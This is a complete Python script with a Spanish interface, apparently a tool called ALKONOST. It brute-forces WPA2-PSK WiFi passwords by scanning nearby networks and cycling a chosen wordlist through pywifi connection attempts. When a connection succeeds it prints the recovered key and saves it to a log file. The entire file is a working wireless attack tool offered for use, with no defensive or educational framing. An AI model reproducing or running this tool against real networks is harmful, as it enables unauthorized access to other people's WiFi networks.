import pywifi
from pywifi import const
import time
import datetime
import os
from colorama import Fore, init
import logging
import threading
import sys

init(autoreset=True)
logging.getLogger('pywifi').setLevel(logging.CRITICAL)

# Definir colores
RED = Fore.RED
GREEN = Fore.GREEN
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW
WHITE = Fore.WHITE
GOLDEN = Fore.YELLOW
BLACK = Fore.BLACK
YELLOW = Fore.YELLOW
BEIGE = Fore.LIGHTWHITE_EX


# Variables globales 
loading = True
selected_iface = None
selected_dict_name = None
ssid = None

# Función para banner
def print_banner():
    print(f"{WHITE}      d8888 888      888    d8P   .d88888b.  888b    888  {GOLDEN}.d88888b.   .d8888b. 88888888888 ")
    print(f"{WHITE}     d88888 888      888   d8P   d88P\" \"Y88b 8888b   888 {GOLDEN}d88P\" \"Y88b d88P  Y88b    888     ")
    print(f"{WHITE}    d88P888 888      888  d8P    888     888 88888b  {GOLDEN}888 {GOLDEN}888     888 Y88b.         888     ")
    print(f"{WHITE}   d88P 888 888      888d88K     888     888 888Y88b{GOLDEN} 888 {GOLDEN}888     888  \"Y888b.      888     ")
    print(f"{WHITE}  d88P  888 888      8888888b    888     888 888 {GOLDEN}Y88b888 {GOLDEN}888     888     \"Y88b.    888     ")
    print(f"{WHITE} d88P   888 888      888  Y88b   888     888 {GOLDEN}888  Y88888 {GOLDEN}888     888       \"888    888     ")
    print(f"{WHITE}d8888888888 888      888   Y88b  Y88b. {GOLDEN}.d88P 888   Y8888 {GOLDEN}Y88b. .d88P Y88b  d88P    888     ")
    print(f"{WHITE}d88P    888 88888888 888    Y88b  {GOLDEN}\"Y88888P\"  888    Y888  {GOLDEN}\"Y88888P\"   \"Y8888P\"     888     ")
    print(f"{WHITE}                                                                                             ")
    print(f"{WHITE}                                                               {WHITE}v{GOLDEN}1.2.1{WHITE}-{BLUE}SVAROG{GREEN} ")
    print(f"{WHITE}                                                               {WHITE}By: {GOLDEN}SrWyatt{GREEN}                 ")
    print(f" ")
# Función para separador
def print_separator():
    print(GOLDEN + '⋆˙⟡' * 30)

# Función para limpiar pantalla
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Función para mostrar la UI estática y actualizar solo el temporizador
def print_loading(start_time):
    # Mostrar la UI estática una vez
    clear_screen()
    print_banner()
    print_separator()
 #   print(GREEN + '\n\n\n')
    print(GOLDEN + '----------------------------------')
    print(WHITE + f'Interfaz seleccionada: {GOLDEN}{selected_iface.name() if selected_iface else "N/A"}')
    print(WHITE + f'Diccionario: {GOLDEN}{selected_dict_name if selected_dict_name else "N/A"}')
    print(WHITE + f'Red: {GOLDEN}{ssid if ssid else "N/A"}')
    print(GOLDEN + '---------------------------------')

    while loading:
        elapsed = time.time() - start_time
        hours, rem = divmod(elapsed, 3600)
        minutes, seconds = divmod(rem, 60)
        time_str = f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"
        sys.stdout.write(WHITE + f'Cargando... {GOLDEN}({time_str})\r')
        sys.stdout.flush()
        time.sleep(0.1)  

# Función principal
def main():
    global loading, selected_iface, selected_dict_name, ssid
    while True:
        # Flujo 1: Seleccionar interfaz
        clear_screen()
        print_banner()
        print_separator()
        print(WHITE + 'Selecciona la interfaz de red')
        print(WHITE + 'para escanear las redes')
        print(WHITE + 'wifi disponibles.')
        print(GOLDEN + '----------------------------------')
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()
        if not interfaces:
            print(RED + 'No se detectaron interfaces WiFi.')
            time.sleep(2)
            continue
        print(WHITE + 'Interfaces detectadas:')
        for i, iface in enumerate(interfaces, 1):
            print(WHITE + f'{i} - {iface.name()}')
        print(GOLDEN + '==================================')
        print(RED + '666 - Cancelar operacion')
        print(GOLDEN + '----------------------------------')
        try:
            choice = input('[/]> ')
            ch = int(choice)
            if ch == 666:
                return
            if 1 <= ch <= len(interfaces):
                selected_iface = interfaces[ch - 1]
            else:
                print(GREEN + 'Opcion invalida.')
                time.sleep(2)
                continue
        except ValueError:
            print(GREEN + 'Entrada invalida.')
            time.sleep(2)
            continue

        # Flujo 2: Seleccionar diccionario
        clear_screen()
        print_banner()
        print_separator()
        print(f"{WHITE} Interfaz: {GOLDEN}{selected_iface.name()}")
        print(GOLDEN + '__________________________________')
        print(WHITE + 'Selecciona el diccionario implicado')
        print(GOLDEN + '----------------------------------')
        pass_dir = 'pass'
        if not os.path.exists(pass_dir):
            print(RED + 'Directorio "pass" no encontrado.')
            time.sleep(2)
            continue
        dictionaries = [f for f in os.listdir(pass_dir) if f.endswith('.txt')]
        if not dictionaries:
            print(RED + 'No se encontraron diccionarios.')
            time.sleep(2)
            continue
        print(WHITE + 'Diccionarios encontrados:')
        for i, dic in enumerate(dictionaries, 1):
            print(WHITE + f'{i} - {dic}')
        print(GOLDEN + '==================================')
        print(RED + '666 - Cancelar operacion')
        print(GOLDEN + '----------------------------------')
        try:
            choice = input('[/]> ')
            dict_choice = int(choice)
            if dict_choice == 666:
                return
            if 1 <= dict_choice <= len(dictionaries):
                selected_dict = os.path.join(pass_dir, dictionaries[dict_choice - 1])
                selected_dict_name = dictionaries[dict_choice - 1]
            else:
                print(GREEN + 'Opcion invalida.')
                time.sleep(2)
                continue
        except ValueError:
            print(GREEN + 'Entrada invalida.')
            time.sleep(2)
            continue

        # Flujo 3: Seleccionar red (escaneo)
        clear_screen()
        print_banner()
        print_separator()
        print(f"{WHITE} Interfaz: {GOLDEN}{selected_iface.name()}")
        print(f"{WHITE} Diccionario: {GOLDEN}{selected_dict_name}")
        print(GOLDEN + '---------------------------------')
        print(WHITE + 'Selecciona una de las redes')
        print(WHITE + 'detectadas')
        print(GOLDEN + '----------------------------------')
        selected_iface.scan()
        time.sleep(5)
        networks = selected_iface.scan_results()
        if not networks:
            print(RED + 'No se detectaron redes WiFi.')
            time.sleep(2)
            continue
        print(WHITE + 'Redes inalámbricas detectadas:')
        ssids = []
        for i, net in enumerate(networks, 1):
            if net.ssid:
                print(WHITE + f'{i} - {net.ssid}')
                ssids.append(net)
        print(GOLDEN + '==================================')
        print(RED + '666 - Cancelar operacion')
        print(GOLDEN + '----------------------------------')
        try:
            choice = input('[/]> ')
            ch = int(choice)
            if ch == 666:
                return
            if 1 <= ch <= len(ssids):
                selected_network = ssids[ch - 1]
                ssid = selected_network.ssid
            else:
                print(RED + 'Opcion invalida.')
                time.sleep(2)
                continue
        except ValueError:
            print(RED + 'Entrada invalida.')
            time.sleep(2)
            continue

        # Flujo de escaneo (brute force)
        clear_screen()
        print_banner()
        print_separator()
        print(f"{WHITE} Interfaz: {GOLDEN}{selected_iface.name()}")
        print(f"{WHITE} Diccionario: {GOLDEN}{selected_dict_name}")
        print(f"{WHITE} Interfaz: {GOLDEN}{selected_iface.name}")
        print(f"{WHITE} Red: {GOLDEN}{ssid}")
        print(GREEN + '---------------------------------')

        # Cargar diccionario
        with open(selected_dict, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        found_key = 'N/a'
        start_time = time.time()
        loading = True
        loading_thread = threading.Thread(target=print_loading, args=(start_time,))
        loading_thread.start()

        for pwd in passwords:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            selected_iface.remove_all_network_profiles()
            tmp_profile = selected_iface.add_network_profile(profile)
            selected_iface.connect(tmp_profile)
            time.sleep(3)
            if selected_iface.status() == const.IFACE_CONNECTED:
                found_key = pwd
                selected_iface.disconnect()
                break
            else:
                selected_iface.disconnect()

        loading = False  # Detener el hilo de carga
        loading_thread.join()  # Esperar a que el hilo termine

        end_time = time.time()
        duration = end_time - start_time
        hours, rem = divmod(duration, 3600)
        minutes, seconds = divmod(rem, 60)
        time_str = f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"

        # Flujo 4: Resultado
        clear_screen()
        print_banner()
        print_separator()
        print(f"{WHITE} Interfaz: {GOLDEN}{selected_iface.name()}")
        print(f"{WHITE} Diccionario: {GOLDEN}{selected_dict_name}")
        print(f"{WHITE} Red: {GOLDEN}{ssid}")
        print(f"{WHITE} Clave: {GOLDEN}{found_key}")
        print(GREEN + '---------------------------------')

        # Guardar log
        scan_dir = 'scan'
        if not os.path.exists(scan_dir):
            os.makedirs(scan_dir)
        now = datetime.datetime.now()
        time_f = now.strftime('%H%M%S')
        date_f = now.strftime('%Y%m%d')
        log_file = os.path.join(scan_dir, f'ALK_{time_f}_{date_f}.txt')
        with open(log_file, 'w') as f:
            f.write(f'{WHITE}Interfaz: {GOLDEN}{selected_iface.name()}\n')
            f.write(f'{WHITE}Diccionario: {GOLDEN}{selected_dict_name}\n')
            f.write(f'{WHITE}Red: {GOLDEN}{ssid}\n')
            f.write(f'{WHITE}Clave: {GOLDEN}{found_key}\n')
            f.write(f'{WHITE}Tiempo total: {GOLDEN}{time_str}\n')
        print(f'{WHITE}Archivo de registro guardado como {GOLDEN}/scan/{log_file}')
        print(f'{WHITE}Tiempo total: {GOLDEN}{time_str}')
        print(GOLDEN + '_____________________________________')
        print(GREEN + '\n\n')
        print(BLUE + '00. Reiniciar proceso')
        print(RED + '666. Finalizar (Cerrar script)')
        choice = input('[/]> ')
        if choice == '666':
            return
       

if __name__ == '__main__':
    main()
